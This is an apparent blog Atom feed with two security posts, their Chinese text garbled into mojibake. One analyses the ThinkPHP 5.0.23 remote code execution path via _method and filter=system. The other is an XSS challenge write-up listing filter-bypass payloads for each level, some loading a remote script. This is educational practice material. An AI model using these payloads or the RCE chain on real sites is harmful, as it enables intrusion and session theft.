<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>é£ä¹‹æ –æ¯åœ°</title>
  
  <subtitle>habitat of wind</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hurricane618.me/"/>
  <updated>2019-02-03T02:16:41.182Z</updated>
  <id>https://hurricane618.me/</id>
  
  <author>
    <name>hurricane618</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>thinkphp 5.0.23 rceåˆ†æå’Œå¤ç°</title>
    <link href="https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/"/>
    <id>https://hurricane618.me/2019/02/03/thinkphp-5-0-23-rce/</id>
    <published>2019-02-03T02:08:15.000Z</published>
    <updated>2019-02-03T02:16:41.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>å…¥å£æ˜¯åœ¨app::run()ï¼Œè¿™é‡Œæœ‰åˆ›å»ºhttpçš„è¯·æ±‚å®ä¾‹ï¼Œ</p><img src="/2019/02/03/thinkphp-5-0-23-rce/1.png"><p>éšååœ¨åé¢ä¼šæœ‰è·¯ç”±æ£€æŸ¥ï¼Œä»è¿™é‡Œè·Ÿè¿›å‡½æ•°<code>routeCheck</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/2.png"><p>åœ¨è·¯ç”±æ£€æŸ¥ä¸­ä¼šåˆ°è·¯ç”±ç±»çš„checkæ–¹æ³•å¤„ï¼Œç»§ç»­è·Ÿè¿›ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/3.png"><p>åœ¨checkä¸­ä¼šæœ‰è·å–å½“å‰æ–¹æ³•çš„method</p><img src="/2019/02/03/thinkphp-5-0-23-rce/4.png"><p>ä¸‹é¢åœ¨methodä¸­ä¼šè·å–<code>var_method</code>è¿™ä¸ªä¼ªå˜é‡ï¼Œå…¶å®è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬é€šè¿‡postä¼ è¿›çš„<code>_method</code>ï¼Œè¿™é‡Œè¿›å…¥åˆ¤æ–­ä¹‹åä¼šå°†æˆ‘ä»¬postçš„å€¼å½“åšRequestç±»çš„æ–¹æ³•è°ƒç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬çš„pocæ˜¯ä¼ å…¥çš„<code>__construct</code>ï¼Œè¿™æ ·å°±ä¼šè°ƒç”¨å®ƒçš„æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”å‚æ•°æ˜¯postæ•°æ®ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/5.png"><p>ç»§ç»­è·Ÿè¿›æ„é€ æ–¹æ³•ï¼Œè¿™é‡Œçš„foreachä¼šéå†æ‰€æœ‰å˜é‡ï¼Œå°†å­˜åœ¨çš„å‚æ•°å…¨éƒ¨è¦†ç›–æ‰ï¼Œåœ¨æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ä¸­çš„filterï¼Œå°±æŠŠä¹‹å‰çš„è¦†ç›–äº†ï¼Œå¹¶ä¸”åœ¨è¿™é‡Œä¼ å…¥methodä¸ºgetçš„åŸå› ä¹Ÿæ˜¯å› ä¸ºä¹‹å‰æ³¨å†Œè·¯ç”±æ˜¯getæ–¹æ³•ï¼Œæ‰€ä»¥è¿™é‡Œè¦æŠŠè¯·æ±‚çš„methodè¦†ç›–æˆgetï¼Œé¿å…æŠ¥é”™ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/6.png"><p>åœ¨è¿™è°ƒç”¨å®Œæˆä¹‹å<code>routeCheck</code>å°†è¿”å›<code>method</code>èµ‹å€¼ç»™<code>dispatch</code>ã€‚ä¹‹åä¼šç»§ç»­åœ¨runå‡½æ•°é‡Œé¢æ‰§è¡Œexecå‡½æ•°ã€‚ç”±äºtypeä¸ºmethodæ‰§è¡Œç›¸åº”çš„åˆ†æ”¯ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/7.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/8.png"><p>è€Œè¿™é‡Œçš„<code>param</code>æ–¹æ³•èƒ½è·å–å‚æ•°ï¼Œå¹¶ä¸”å’ŒURLä¸­çš„å‚æ•°åˆå¹¶ã€‚è¿™é‡Œå¾—åˆ°çš„å‚æ•°å°±æ˜¯postæ•°æ®ä¸­çš„<code>get[]=dir</code></p><img src="/2019/02/03/thinkphp-5-0-23-rce/9.png"><p>å®ƒçš„è¿”å›è°ƒç”¨äº†<code>input</code>æ–¹æ³•ï¼Œè·Ÿè¿›<code>input</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/10.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/11.png"><p><code>input</code>æœ€åå°†å‚æ•°å’Œ<code>filter</code>ä¸€èµ·ä¼ å…¥<code>array_walk_recursive</code>ä¸­ã€‚å…¶ä¸­å‚æ•°ä¸­æœ‰æˆ‘ä»¬ä¼ çš„<code>dir</code>ï¼Œè€Œ<code>filter</code>é€šè¿‡<code>getFilter</code>æœ‰æˆ‘ä»¬ä¼ çš„<code>system</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/12.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/13.png"><p>åœ¨è¿™ä¹‹åè°ƒç”¨çš„<code>array_walk_recursive</code>ä¼šç”¨<code>filterValue</code>ï¼Œæ¥å¤„ç†æ•°æ®ï¼Œåœ¨è¿™ä¹‹ä¸­ç”¨<code>call_user_func</code>ã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/14.png"><p>è¿™é‡Œ<code>system</code>å’Œ<code>dir</code>åˆ†åˆ«æ˜¯filterå’Œvalueä¸­çš„å€¼ï¼Œå‡‘åœ¨ä¸€èµ·å°±è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚</p><p>è¿™é‡Œæ˜¯ç¬¬ä¸€ä¸ªpocçš„åˆ†æï¼Œè€Œç¬¬äºŒä¸ªpocæ¯”è¾ƒç±»ä¼¼ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨inputå‡½æ•°ï¼Œè¿™é‡Œåˆ©ç”¨çš„ç‚¹æ˜¯åœ¨paramçš„<code>$this-&gt;method(true)</code>ä¸­ã€‚</p><p>å› ä¸ºæ˜¯trueæ‰€ä»¥è¿›å…¥äº†<code>server(&#39;REQUEST_METHOD&#39;)</code>ï¼Œæœ€ååŒæ ·åˆ°inputä¸­ï¼Œå¹¶ä¸”dataæ˜¯serveræ•°ç»„ï¼ŒfilteråŒæ ·æ˜¯systemã€‚</p><img src="/2019/02/03/thinkphp-5-0-23-rce/15.png"><p>é€ æˆçš„æ•ˆæœéƒ½æ˜¯å‘½ä»¤æ‰§è¡Œã€‚</p><h2 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h2><img src="/2019/02/03/thinkphp-5-0-23-rce/16.png"><img src="/2019/02/03/thinkphp-5-0-23-rce/17.png"><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>åœ¨è°ƒè¯•çš„è¿‡ç¨‹ä¸­ä¹Ÿç®—æ˜¯å­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œæ¯”å¦‚vscode+xdebugçš„åŠ¨æ€è°ƒè¯•æ–¹æ¡ˆï¼Œç‰¹åˆ«çš„è½»å·§ï¼ŒåŠŸèƒ½ç‚¹ä¹Ÿå¾ˆå®Œå–„ã€‚å…³äºåœ¨éªŒè¯pocçš„æ—¶å€™å…¶å®å‡ºäº†ä¸€äº›å°é—®é¢˜ï¼Œé‚£å°±æ˜¯æˆ‘çš„burpå‘é€çš„postæ•°æ®å’Œheaderä¹‹å‰å¤šäº†ä¸€ä¸ªç©ºè¡Œï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªå¤šçš„ç©ºè¡Œå¯¼è‡´æˆ‘çš„pocè€æ˜¯å¤±è´¥â€¦â€¦è¿™ä¹Ÿæ˜¯æ³¨æ„å°çš„ç»†èŠ‚é—®é¢˜ï¼Œåªæœ‰åœ¨çœŸæ­£è°ƒè¯•çš„æ—¶å€™æ‰ä¼šè¢«å‘ç°ã€‚</p><p>ä»¥åè¿˜æ˜¯è¦å¤šåŠ¨æ‰‹å®è·µã€‚æ¥ä¸‹æ¥å‡ å¤©æˆ‘ä¼šç ”ç©¶ä¸€ç‚¹æ–°çš„ä¸œè¥¿ï¼Œæ‹­ç›®ä»¥å¾…å§ã€‚</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://paper.seebug.org/787/" target="_blank" rel="noopener">https://paper.seebug.org/787/</a></p><p><a href="https://blog.csdn.net/qq_29647709/article/details/86307859" target="_blank" rel="noopener">https://blog.csdn.net/qq_29647709/article/details/86307859</a></p><p><a href="https://xz.aliyun.com/t/3845" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;åˆ†æ&quot;&gt;&lt;a href=&quot;#åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æ&quot;&gt;&lt;/a&gt;åˆ†æ&lt;/h2&gt;&lt;p&gt;å…¥å£æ˜¯åœ¨app::run()ï¼Œè¿™é‡Œæœ‰åˆ›å»ºhttpçš„è¯·æ±‚å®ä¾‹ï¼Œ&lt;/p&gt;
&lt;img src=&quot;/2019/02/03/thinkphp-5-0-
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ä»£ç å®¡è®¡" scheme="https://hurricane618.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="https://hurricane618.me/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>haozi xss æŒ‘æˆ˜èµ› writeup</title>
    <link href="https://hurricane618.me/2019/01/27/haozi-xss-challenges/"/>
    <id>https://hurricane618.me/2019/01/27/haozi-xss-challenges/</id>
    <published>2019-01-27T13:38:32.000Z</published>
    <updated>2019-01-27T13:40:36.963Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;div&gt;'</span> + input + <span class="string">'&lt;/div&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡ä»€ä¹ˆè¯´çš„ï¼Œdivæ ‡ç­¾+æ²¡è¿‡æ»¤ç›´æ¥æ’ <code>&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;textarea&gt;'</span> + input + <span class="string">'&lt;/textarea&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç‚¹åœ¨<code>&lt;textarea&gt;</code>è¿™ç§æ ‡ç­¾ä¸­ï¼Œéœ€è¦é—­åˆæ ‡ç­¾ï¼Œåœ¨æ’å…¥payloadã€‚<code>&lt;/textarea&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;input type="name" value="'</span> + input + <span class="string">'"&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å…¥ç‚¹åœ¨inputæ ‡ç­¾çš„valueå±æ€§ä¸­ï¼Œç„¶è€Œä¾æ—§æ²¡æœ‰è¿‡æ»¤ï¼Œåªè¦é€ƒé€¸åŒå¼•å·å†æ’å…¶ä»–æ ‡ç­¾å°±å¥½ã€‚<code>1&quot;&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>()</code>ï¼Œç›´æ¥æ¢æˆåå¼•å·å°±å¯ä»¥äº†ã€‚</p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripBracketsRe = <span class="regexp">/[()`]/g</span></span><br><span class="line">  input = input.replace(stripBracketsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> input</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åå¼•å·ä¹ŸGGï¼Œåªå¥½ç¼–ç äº†è¿™é‡Œç”¨jsç¼–ç ã€‚<code>&lt;img src=1 onerror=&#39;&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&#39;&gt;</code></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/--&gt;/g</span>, <span class="string">'ğŸ˜‚'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;!-- '</span> + input + <span class="string">' --&gt;'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¸€å¤´é›¾æ°´ï¼Œæäº†ç¼–ç æ— æ³•è§£æï¼Œæœ‰æŸ¥æ³¨é‡Šç½‘ä¸Šåˆæ²¡æœ‰â€¦â€¦ çœ‹äº†å…¶ä»–äººçš„writeupä¹‹åï¼Œç»“æœæœç„¶æ˜¯å¤šæ ·æ€§çš„æ³¨é‡Šã€‚</p><p>è¿™é‡Œåœ¨htmlé‡Œé¢çš„æ³¨é‡Šä¸­æœ‰ä¸¤ç§é™¤äº†ä¸€èˆ¬çš„<code>&lt;!-- --&gt;</code> è¿˜æœ‰å¯¹ç§°çš„å†™æ³•<code>&lt;!-- --!&gt;</code> ï¼Œæ‰€ä»¥è¿™é‡Œæ²¡è¿‡æ»¤å¯¹ç§°å†™æ³•ï¼Œæ‰€ä»¥å°±ç”¨è¿™ç§å°±å¯ä»¥é€ƒé€¸è¿‡æ»¤æ’æ ‡ç­¾ã€‚<code>--!&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.replace(<span class="regexp">/auto|on.*=|&gt;/ig</span>, <span class="string">'_'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;input value=1 <span class="subst">$&#123;input&#125;</span> type="text"&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½å§ï¼Œå°è¯•äº†å¾ˆä¹…ï¼Œæƒ³åˆ°äº†è¿™ç§å‡ºç°åœ¨æ ‡ç­¾å†…éƒ¨çš„è¾“å…¥ç‚¹ï¼Œæœ‰ä¸¤ç§æ€è·¯ï¼Œä¸€ä¸ªæ˜¯åœ¨æ ‡ç­¾å†…éƒ¨çš„å±æ€§å’Œäº‹ä»¶æ¥è§¦å‘jsï¼›ä¸€ä¸ªæ˜¯é—­åˆç°åœ¨çš„æ ‡ç­¾å»æ’å…¥æ–°çš„æ”»å‡»å‘é‡ã€‚æƒ³äº†è€ä¹…ä¸çŸ¥é“æ€ä¹ˆç ´â€¦â€¦çœ‹äº†writeupå¾—çŸ¥æ˜¯åˆ©ç”¨æ¢è¡Œï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªå°ç»†èŠ‚äº†ï¼Œè¿™é‡Œçš„æ­£åˆ™æ˜¯<code>on.*=</code>è¿™æ„å‘³ç€<code>on</code>å’Œ<code>=</code>æ˜¯ä»¥ä¸€ä¸ªæ•´ä½“å»åˆ¤æ–­çš„ï¼Œè¿™ç§ä»¥æ•´ä½“å½¢å¼å»åšåˆ¤æ–­çš„é€»è¾‘å¯ä»¥ç”¨ä¸€äº›æ‹†åˆ†æŠ€å·§äº†ç»•è¿‡ã€‚æ‰€ä»¥æ­£ç¡®çš„payloadä¸º<code>onmousemoveæ¢è¡Œ=alert(1)</code>ã€‚</p><p>è¿™é‡Œè¯•äº†å¾ˆä¹…éƒ½æ²¡æ‰¾åˆ°éäº¤äº’çš„æ“ä½œï¼Œæœ€åè¿˜æ˜¯åªæœ‰äº¤äº’æ“ä½œè§¦å‘xssã€‚</p><h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> stripTagsRe = <span class="regexp">/&lt;\/?[^&gt;]+&gt;/gi</span></span><br><span class="line"></span><br><span class="line">  input = input.replace(stripTagsRe, <span class="string">''</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;article&gt;<span class="subst">$&#123;input&#125;</span>&lt;/article&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨æµè§ˆå™¨çš„è‡ªåŠ¨è¡¥å…¨ç‰¹æ€§ç»•è¿‡â€¦â€¦åˆæ˜¯ä¸€ä¸ªè€çŸ¥è¯†ç‚¹å°±æ˜¯æ²¡æƒ³åˆ°è¿™ä¸ªç‚¹ï¼Œæƒ³åˆ°äº†è¦åœ¨<code>&lt;&gt;</code>ä¸Šåšæ–‡ç« ï¼Œæ²¡æƒ³åˆ°è‡ªåŠ¨è¡¥å…¨ã€‚ã€‚ã€‚è®°ä¸ªç¬”è®°å½“æ ‡ç­¾ä¸å®Œæ•´çš„æ—¶å€™<code>&lt;img src=1 onerror=alert(1)</code> ï¼Œåƒè¿™æ ·æµè§ˆå™¨ä¼šè‡ªåŠ¨æŠŠæœ«å°¾çš„<code>&gt;</code>ç”¨å…¶ä»–çš„æ ‡ç­¾è¡¥å……ä¸Šã€‚å®é™…è‡ªåŠ¨è¡¥å……å¦‚ä¸‹å›¾ï¼š</p><img src="/2019/01/27/haozi-xss-challenges/1.png"><p>è€Œæˆ‘ä»¬çš„è¾“å…¥æ‹¼æ¥ä¸Šå®é™…ä¸Šæ˜¯è¿™æ ·çš„<code>&lt;article&gt;&lt;img src=1 onerror=alert(1) &lt;/article&gt;</code></p><p>å¯ä»¥çœ‹åˆ°åŸæ¥çš„<code>&lt;/article&gt;</code>æˆäº†imgæ ‡ç­¾ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œéšåæµè§ˆå™¨åˆåœ¨åé¢è¡¥å……äº†ä¸€ä¸ª<code>&lt;/article&gt;</code>ã€‚</p><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">src</span>) </span>&#123;</span><br><span class="line">  src = src.replace(<span class="regexp">/&lt;\/style&gt;/ig</span>, <span class="string">'/* \u574F\u4EBA */'</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;style&gt;</span></span><br><span class="line"><span class="string">      <span class="subst">$&#123;src&#125;</span></span></span><br><span class="line"><span class="string">    &lt;/style&gt;</span></span><br><span class="line"><span class="string">  `</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‡ç‚¹ä¾æ—§æ˜¯æ­£åˆ™è¿‡æ»¤çš„é—®é¢˜ï¼Œè¿™é‡Œçš„è¿‡æ»¤è§„åˆ™å†™çš„å¤ªæ­»ï¼Œæ‰€ä»¥å¯ä»¥åœ¨ä¸­é—´åŠ å…¥ç©ºæ ¼æˆ–è€…æ¢è¡Œæ¥ç»•è¿‡ã€‚</p><p><code>&lt;/style &gt;&lt;img src=1 onerror=alert(1)&gt;</code>æˆ–è€…<code>&lt;/styleæ¢è¡Œ&gt;&lt;img src=1 onerror=alert(1)&gt;</code></p><h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;input&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™½ç„¶é™åˆ¶äº†å¿…é¡»è¦åœ¨<code>www.segmentfault.com</code>è¿™ä¸ªåŸŸä¸‹ï¼Œä½†æ˜¯ä¹Ÿæ²¡è¿‡æ»¤å…¶ä»–å±é™©å­—ç¬¦ï¼Œé‚£æˆ‘ä»¬ç›´æ¥é—­åˆå‰é¢çš„scriptç„¶ååœ¨åé¢æ„é€ è‡ªå·±çš„æ¶æ„è„šæœ¬å°±è¡Œã€‚<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://xss.haozi.me/j.js</code></p><p>ä¸Šé¢æ˜¯åˆ©ç”¨åŒå¼•å·å­—ç¬¦å»ç»“åˆæ„é€ çš„payloadï¼Œä¹Ÿå¯ä»¥ç›´æ¥æ³¨é‡Šæ‰ã€‚<code>https://www.segmentfault.com&quot;&gt;&lt;/script&gt;&lt;svg/onload=alert(1)&gt;//</code></p><h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">escapeHtml</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> s.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;amp;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/'/g</span>, <span class="string">'&amp;#39;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/"/g</span>, <span class="string">'&amp;quot;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>)</span><br><span class="line">            .replace(<span class="regexp">/\//g</span>, <span class="string">'&amp;#x2f'</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> domainRe = <span class="regexp">/^https?:\/\/www\.segmentfault\.com/</span></span><br><span class="line">  <span class="keyword">if</span> (domainRe.test(input)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">`&lt;script src="<span class="subst">$&#123;escapeHtml(input)&#125;</span>"&gt;&lt;/script&gt;`</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'Invalid URL'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯ä¸Šé“é¢˜ç›®çš„åŠ å¼ºç‰ˆï¼ŒæŠŠå¤šä½™çš„ç‰¹æ®Šå­—ç¬¦éƒ½è½¬ä¹‰æˆhtmlå®ä½“äº†ï¼Œè¿™æ ·å°±æ²¡æœ‰åŠæ³•çªç ´srcè¿™ä¸ªå­—ç¬¦ä¸²ï¼Œçªç ´å£åªèƒ½åœ¨srcè¿™é‡Œã€‚è§‚å¯Ÿå‘ç°æ²¡æœ‰è¿‡æ»¤<code>@</code>å’Œ<code>#</code>æƒ³åˆ°åº”è¯¥æ˜¯è¦ç”¨åˆ°urlç›¸å…³çš„trickã€‚æŠŠorangeçš„pptç¿»å‡ºæ¥å¤ä¹ ï¼Œè¯•äº†<code>@</code>å’Œ<code>#@</code>éƒ½ä¸è¡Œã€‚ã€‚ã€‚ä¸€è„¸æ‡µé€¼</p><p>æœ€åå»çœ‹äº†å…¶ä»–äººçš„writeupï¼Œç­”æ¡ˆæ˜¯<code>https://www.segmentfault.com@xss.haozi.me/j.js</code></p><p>åˆ©ç”¨<code>@</code>çš„å­èµ„æºè¯·æ±‚åŠŸèƒ½å»è¯·æ±‚æ¶æ„çš„jsï¼Œç„¶è€Œæˆ‘æ˜¯ç”¨chromeæ¥åšé¢˜çš„ï¼Œä¹‹å‰åŠå¤©æ²¡ååº”ï¼Œåœ¨æ§åˆ¶å°çœ‹äº†çœ‹ï¼Œå‘ç°chromeç¦ç”¨äº†å­èµ„æºè¯·æ±‚ã€‚å¤ªå°´å°¬äº†â€¦â€¦</p><img src="/2019/01/27/haozi-xss-challenges/2.png"><img src="/2019/01/27/haozi-xss-challenges/3.png"><p>æœ€ååœ¨ç«ç‹æµ‹è¯•æˆåŠŸï¼Œchromeçš„å®‰å…¨æ€§çœŸæ˜¯é«˜ã€‚</p><h2 id="0x0B"><a href="#0x0B" class="headerlink" title="0x0B"></a>0x0B</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span> (<span class="params">input</span>) </span>&#123;</span><br><span class="line">  input = input.toUpperCase()</span><br><span class="line">  <span class="keyword">return</span> <span class="string">`&lt;h1&gt;<span class="subst">$&#123;input&#125;</span>&lt;/h1&gt;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜æ˜¯æŠŠè¾“å…¥å…¨éƒ¨è½¬æˆå¤§å†™å­—æ¯ï¼Œè¿™æ ·çš„è¯<code>alert</code>å°±æ²¡æœ‰åŠæ³•æ‰§è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬æœ‰ç¼–ç å•Šï¼Œå¹¶ä¸”å¤§å°å†™å¯¹æ ‡ç­¾å’Œå±æ€§äº‹ä»¶æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥åªè¦æŠŠ<code>alert(1)</code>çš„éƒ¨åˆ†æ¢æˆjsç¼–ç å°±okäº†ã€‚</p><p><code>&lt;img src=1 onerror=&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#10;&gt;</code></p><h2 id="0x0C"><a href="#0x0C" class="headerlink" 